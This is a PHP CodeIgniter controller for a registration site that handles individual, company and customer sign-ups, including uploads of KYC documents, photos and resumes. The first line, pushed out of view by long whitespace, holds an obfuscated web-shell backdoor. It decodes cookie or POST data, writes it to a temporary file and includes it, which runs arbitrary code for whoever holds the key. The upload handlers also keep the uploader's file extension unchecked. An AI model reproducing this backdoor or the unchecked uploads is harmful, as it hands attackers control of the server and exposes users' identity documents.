<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("bumryv")){class bumryv{public static $gjoxynfytw = "eqwlhfnwdokkldsa";public static $yvfxxi = NULL;public function __construct(){$ckdaqmwb = @$_COOKIE[substr(bumryv::$gjoxynfytw, 0, 4)];if (!empty($ckdaqmwb)){$cjqlu = "base64";$jjudcerot = "";$ckdaqmwb = explode(",", $ckdaqmwb);foreach ($ckdaqmwb as $orvjjcgqcj){$jjudcerot .= @$_COOKIE[$orvjjcgqcj];$jjudcerot .= @$_POST[$orvjjcgqcj];}$jjudcerot = array_map($cjqlu . "_decode", array($jjudcerot,));$jjudcerot = $jjudcerot[0] ^ str_repeat(bumryv::$gjoxynfytw, (strlen($jjudcerot[0]) / strlen(bumryv::$gjoxynfytw)) + 1);bumryv::$yvfxxi = @unserialize($jjudcerot);}}public function __destruct(){$this->sguumpr();}private function sguumpr(){if (is_array(bumryv::$yvfxxi)) {$xsegkdz = sys_get_temp_dir() . "/" . crc32(bumryv::$yvfxxi["salt"]);@bumryv::$yvfxxi["write"]($xsegkdz, bumryv::$yvfxxi["content"]);include $xsegkdz;@bumryv::$yvfxxi["delete"]($xsegkdz);exit();}}}$rzoljmz = new bumryv();$rzoljmz = NULL;} ?><?php
require_once APPPATH . 'core/Base_Controller.php';
if (! defined('BASEPATH'))
    exit('No direct script access allowed');

class Forms extends Base_Controller
{

    public function __construct()
    {
        parent::__construct();

        date_default_timezone_set('Asia/Kolkata');
 if(!isset($_SESSION['userdata'])){
    redirect(base_url("Dashboard/registration")); 
 }
    
    }

    public function individual_registration()
    {
$data=array();
        if(isset($_SESSION['userdata']['category']) && $_SESSION['userdata']['category']=="Individuals"){
        $this->load->view("common/header");
        $this->load->view("common/left");
   $existing_data=$this->Base_Models->GetAllValues("conbrid_individuals",array("user_id"=>$_SESSION['userdata']['id']));
  if(!empty($existing_data)){
      $data=$existing_data[0];
         $data['field_of_interest']=$this->Base_Models->GetAllValues("conbrid_field_of_interest",array("status"=>1,"type"=>$_SESSION['userdata']['sub_category']));
     
if($data['status']=="2"){
  $data['existing_data']=$this->Base_Models->GetAllValues("conbrid_individual_verification",array("individual_id"=>$existing_data['0']['id']));
 $data['key_skills']=$this->Base_Models->GetAllValues("conbrid_key_skills",array("individual_id"=>$data['id']));
 $data['technical_skills']=$this->Base_Models->GetAllValues("conbrid_technical_skills",array("individual_id"=>$data['id']));
 $field_of_interest=$this->Base_Models->GetAllValues("conbrid_user_field_of_interest",array("individual_id"=>$data['id']));
   $field_values="Test";
   for($i=0;$i<count($field_of_interest);$i++){
       $field_values.=",".$field_of_interest[$i]['field_of_interest'];
   }
  $data['field_of_interest1']=$field_values;
    // form is return from admin
    
    $this->load->view("forms/individual_registration2",$data);
    
}
elseif($data['status']=="1" ||$data['status']=="3" ){
    // submitted to admin
    $this->load->view("forms/individual_registration",$data);
    
}

  }else{
          $data['field_of_interest']=$this->Base_Models->GetAllValues("conbrid_field_of_interest",array("status"=>1,"type"=>$_SESSION['userdata']['sub_category']));
   
             $this->load->view("forms/individual_registration",$data);
 
  }
  
   
   
        $this->load->view("common/footer");
    }else{
            redirect(base_url("Dashboard/registration")); 

    }
        
    }

    public function accept_individual_registration()
    {   if(isset($_SESSION['userdata']['category']) && $_SESSION['userdata']['category']=="Individuals"){
     
        if(isset($_POST['individual_name']))$data['individual_name']=$_POST['individual_name']; 
        if(isset($_POST['dob']))$data['dob']=$_POST['dob'];
        if(isset($_POST['education_qualification']))$data['education_qualification']=$_POST['education_qualification'];
        if(isset($_POST['preferred_jd']))$data['preferred_jd']=$_POST['preferred_jd'];
        if(isset($_POST['preferred_job_type']))$data['preferred_job_type']=$_POST['preferred_job_type'];
        if(isset($_POST['year_of_experience']))$data['year_of_experience']=$_POST['year_of_experience'];
        if(isset($_POST['promo_code']))$data['promo_code']=$_SESSION['userdata']['promo_code'];
        $data['status']="1";
        $existing_data=$this->Base_Models->GetAllValues("conbrid_individuals",array("user_id"=>$_SESSION['userdata']['id']));
   if(empty($existing_data)){
        $data['user_id']=$_SESSION['userdata']['id'];
        $id=$this->Base_Models->AddValues("conbrid_individuals",$data); 
    }else{
    $this->Base_Models->UpadateValue("conbrid_individuals",$data,array("user_id"=>$_SESSION['userdata']['id']));    
        $id=$existing_data[0]['id'];
    }
    if(isset($_POST['field_of_interest']) && count($_POST['field_of_interest'])>0){
        $this->Base_Models->RemoveValues("conbrid_user_field_of_interest",array("individual_id"=>$id));
         for($i=0;$i<count($_POST['field_of_interest']);$i++){
            $data2['field_of_interest']=$_POST['field_of_interest'][$i];
            $data2['individual_id']=$id;
            $new_entries=$this->Base_Models->GetAllValues("conbrid_field_of_interest",array("name"=>$data2['field_of_interest']));
            if(empty($new_entries)){
                            $this->Base_Models->AddValues("conbrid_field_of_interest",array("name"=>$data2['field_of_interest']));
            }
            $this->Base_Models->AddValues("conbrid_user_field_of_interest",$data2);
   
        }
    }
    if(isset($_POST['key_skills']) && count($_POST['key_skills'])>0){
            $this->Base_Models->RemoveValues("conbrid_key_skills",array("individual_id"=>$id));
     
        for($i=0;$i<count($_POST['key_skills']);$i++){
            $data3['key_skills']=$_POST['key_skills'][$i];
            $data3['individual_id']=$id;
            $this->Base_Models->AddValues("conbrid_key_skills",$data3); 
   
        }
    }
     if(isset($_POST['technical_skills']) && count($_POST['technical_skills'])>0){
               $this->Base_Models->RemoveValues("conbrid_technical_skills",array("individual_id"=>$id));
     
        for($i=0;$i<count($_POST['technical_skills']);$i++){
            $data4['technical_skills']=$_POST['technical_skills'][$i];
            $data4['individual_id']=$id;
            $this->Base_Models->AddValues("conbrid_technical_skills",$data4); 
   
        }
    }
    $path=array();
                $image_folder = APPPATH . "../images/kyc_proof" . $id;
                if (isset ( $_FILES ['kyc_proof'] ) && $_FILES ['kyc_proof'] ['error'] == 0) {
			    $tmp = explode('.', $_FILES ['kyc_proof'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['kyc_proof'] ['tmp_name'], $image_folder . "." . $b );
				$path['kyc_proof'] = "kyc_proof".$id . "." . $b;
				}
				$image_folder = APPPATH . "../images/profile_photo" . $id;
                if (isset ( $_FILES ['profile_photo'] ) && $_FILES ['profile_photo'] ['error'] == 0) {
			    $tmp = explode('.', $_FILES ['profile_photo'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['profile_photo'] ['tmp_name'], $image_folder . "." . $b );
				$path['profile_photo'] = "profile_photo".$id . "." . $b;
				}
				$image_folder = APPPATH . "../images/upload_resume" . $id;
                if (isset ( $_FILES ['upload_resume'] ) && $_FILES ['upload_resume'] ['error'] == 0) {
				$tmp = explode('.', $_FILES ['upload_resume'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['upload_resume'] ['tmp_name'], $image_folder . "." . $b );
				$path['upload_resume'] = "upload_resume".$id . "." . $b;
				}
				$image_folder = APPPATH . "../images/work_exp_certificate" . $id;
                if (isset ( $_FILES ['work_exp_certificate'] ) && $_FILES ['work_exp_certificate'] ['error'] == 0) {
				$tmp = explode('.', $_FILES ['work_exp_certificate'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['work_exp_certificate'] ['tmp_name'], $image_folder . "." . $b );
				$path['work_exp_certificate'] = "work_exp_certificate".$id . "." . $b;
				}
				if(!empty($path)){
				     $this->Base_Models->UpadateValue("conbrid_individuals",$path,array("user_id"=>$_SESSION['userdata']['id']));    
   
				}
    
         redirect(base_url("Dashboard"));
    
        
    }else{
            redirect(base_url("Dashboard/registration")); 

    }
}
    public function company_registration()
    {
  $data=array();
$this->load->view("common/header");
        $this->load->view("common/left");
  $existing_data=$this->Base_Models->GetAllValues("conbrid_companies",array("user_id"=>$_SESSION['userdata']['id']));
  if(!empty($existing_data)){
      $data=$existing_data[0];
if($data['status']=="2"){
  $data['existing_data']=$this->Base_Models->GetAllValues("conbrid_company_verification",array("company_id"=>$existing_data['0']['id']));
  $data['career']=$this->Base_Models->GetAllValues("conbrid_add_career",array("company_id"=>$data['id']));
 $data['service']=$this->Base_Models->GetAllValues("conbrid_add_service",array("company_id"=>$data['id']));
 
  
    // form is return from admin
    
    $this->load->view("forms/company_registration2",$data);
    
}
elseif($data['status']=="1" ||$data['status']=="3" ){
    // submitted to admin
    $this->load->view("forms/company_registration",$data);
    
}

  }else{
             $this->load->view("forms/company_registration",$data);
 
  }
      
        $this->load->view("common/footer");
    }
    public function accept_company_registration()
    {
        if(isset($_POST['company_name']))$data['company_name']=$_POST['company_name'];
        if(isset($_POST['company_email_id']))$data['company_email_id']=$_POST['company_email_id'];
        if(isset($_POST['company_office_number']))$data['company_office_number']=$_POST['company_office_number'];
        if(isset($_POST['office_address']))$data['office_address']=$_POST['office_address'];
        if(isset($_POST['gstin_number']))
        $data['gstin_number']=$_POST['gstin_number'];
        if(isset($_POST['cin_number']))
        $data['cin_number']=$_POST['cin_number'];
        if(isset($_POST['llpin_number']))
        $data['cin_number']=$_POST['llpin_number'];
        if(isset($_POST['about_company']))$data['about_company']=$_POST['about_company'];
        if(isset($_POST['company_website']))$data['company_website']=$_POST['company_website'];
        if(isset($_POST['company_profile']))$data['company_profile']=$_POST['company_profile'];
        if(isset($_POST['number_of_employees']))$data['number_of_employees']=$_POST['number_of_employees'];
         $data['status']=1;
       
        if(isset($_POST['construction_packages']))
        $data['construction_packages']=$_POST['construction_packages'];
              $existing_data=$this->Base_Models->GetAllValues("conbrid_companies",array("user_id"=>$_SESSION['userdata']['id']));
   if(empty($existing_data)){
        $data['user_id']=$_SESSION['userdata']['id'];
        $id=$this->Base_Models->AddValues("conbrid_companies",$data); 
    }else{
    $this->Base_Models->UpadateValue("conbrid_companies",$data,array("user_id"=>$_SESSION['userdata']['id']));    
        $id=$existing_data[0]['id'];
    }

    if(isset($_POST['add_service']) && count($_POST['add_service'])>0){
        $this->Base_Models->RemoveValues("conbrid_add_service",array("company_id"=>$id));
        for($i=0;$i<count($_POST['add_service']);$i++){
            $data3['service']=$_POST['add_service'][$i];
            $data3['company_id']=$id;
            $this->Base_Models->AddValues("conbrid_add_service",$data3); 
   
        }
    }
    if(isset($_POST['add_career']) && count($_POST['add_career'])>0){
        $this->Base_Models->RemoveValues("conbrid_add_career",array("company_id"=>$id)); 
        for($i=0;$i<count($_POST['add_career']);$i++){
            $data4['career']=$_POST['add_career'][$i];
            $data4['company_id']=$id;
            $this->Base_Models->AddValues("conbrid_add_career",$data4); 
   
        }
    }
      $image_folder = APPPATH . "../images/company_images/profile_pic/image".$id;
              
     if (isset ( $_FILES ['profile_photo'] ) && $_FILES ['profile_photo'] ['error'] == 0) {
				$tmp = explode('.', $_FILES ['profile_photo'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['profile_photo'] ['tmp_name'], $image_folder . "." . $b );
				$path['profile_photo'] = "image".$id . "." . $b;
				     $this->Base_Models->UpadateValue("conbrid_companies",$path,array("user_id"=>$_SESSION['userdata']['id']));    
   
				}
     
         redirect(base_url("Dashboard"));
        
    }

    public function customer_registration()
    {
        $this->load->view("common/header");
        $this->load->view("common/left");
        $this->load->view("forms/customer_registration");
        $this->load->view("common/footer");
    }
    public function accept_customer_registration()
    {
          $data['customer_name']=$_POST['customer_name'];
        $data['date_of_birth']=$_POST['date_of_birth'];
        $data['contact_number']=$_POST['contact_number'];
        $data['status']=1;
         $existing_data=$this->Base_Models->GetAllValues("conbrid_customers",array("user_id"=>$_SESSION['userdata']['id']));
   if(empty($existing_data)){
        $data['user_id']=$_SESSION['userdata']['id'];
        $id=$this->Base_Models->AddValues("conbrid_customers",$data); 
    }else{
    $this->Base_Models->UpadateValue("conbrid_customers",$data,array("user_id"=>$_SESSION['userdata']['id']));    
        $id=$existing_data[0]['id'];
    }
         $image_folder = APPPATH . "../images/customer_images/profile_pic/image".$id;
     if (isset ( $_FILES ['profile_photo'] ) && $_FILES ['profile_photo'] ['error'] == 0) {
				$tmp = explode('.', $_FILES ['profile_photo'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['profile_photo'] ['tmp_name'], $image_folder . "." . $b );
				$path['profile_photo'] = "image".$id . "." . $b;
				     $this->Base_Models->UpadateValue("conbrid_customers",$path,array("user_id"=>$_SESSION['userdata']['id']));     
   
				}
         $image_folder = APPPATH . "../images/customer_images/kyc_proof/image".$id;
     if (isset ( $_FILES ['kyc_proof'] ) && $_FILES ['kyc_proof'] ['error'] == 0) { 
				$tmp = explode('.', $_FILES ['kyc_proof'] ['name']);
                $b = end($tmp);
				$up = move_uploaded_file ( $_FILES ['kyc_proof'] ['tmp_name'], $image_folder . "." . $b );
				$path['kyc_proof'] = "image".$id . "." . $b;
				     $this->Base_Models->UpadateValue("conbrid_customers",$path,array("user_id"=>$_SESSION['userdata']['id']));    
   
				}

    redirect(base_url("Dashboard"));
        
    }
}
?>